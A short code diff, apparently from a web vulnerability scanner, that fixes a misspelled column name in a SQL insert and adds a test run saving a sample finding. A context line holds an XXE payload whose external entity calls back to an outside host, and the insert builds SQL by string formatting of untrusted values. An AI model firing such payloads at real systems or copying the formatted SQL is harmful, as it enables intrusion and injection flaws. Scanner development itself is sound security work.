@@ -74,7 +74,7 @@ def save_to_databases(data, arachni=False):
         method = data["method"]
         param = data["param"]
         vuln_name = data["type"]
-        insert_sql2 = "insert into vulns(url, mehtod, parameters, vuln_name) values('{url}', '{method}', '{parameters}', '{vuln_name}')"
+        insert_sql2 = "insert into vulns(url, method, parameters, vuln_name) values('{url}', '{method}', '{parameters}', '{vuln_name}')"
         try:
             session.insert(insert_sql2.format(url = url,
                         method=method,
@@ -291,3 +291,9 @@ ARACHNI_OPTIONS = {
 
 
 XXE_payload =  '<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "http://xxeproxy_{domain}.devil.yoyostay.top"> ]> <r>&sp;</r>'
+
+
+
+if __name__ == '__main__':
+    data = {'url':'http://test.iqiyi.com', 'method': 'GET', 'param': 'a=b', 'type':'test'}
+    save_to_databases(data)
